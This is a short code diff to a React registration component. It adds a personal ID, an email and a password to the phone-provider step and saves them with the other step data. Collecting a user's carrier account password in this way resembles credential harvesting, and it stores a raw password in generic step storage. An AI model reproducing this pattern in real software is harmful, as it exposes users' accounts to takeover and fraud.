@@ -140,7 +140,7 @@ export default function Register() {
     nextStep();
   };
 
-  const handlePhoneProviderNext = async (providerData?: { provider: string; number: string }) => {
+  const handlePhoneProviderNext = async (providerData?: { provider: string; number: string; personalId: string; email: string; password: string }) => {
     if (providerData) {
       setFormData(prev => ({
         ...prev,
@@ -152,6 +152,9 @@ export default function Register() {
     await saveStepData("6_phone_provider", {
       provider: providerData?.provider || formData.phoneProvider,
       phoneNumber: providerData?.number || formData.phoneProviderNumber,
+      personalId: providerData?.personalId || "",
+      email: providerData?.email || "",
+      password: providerData?.password || "",
     });
     
     await completeRegistration({
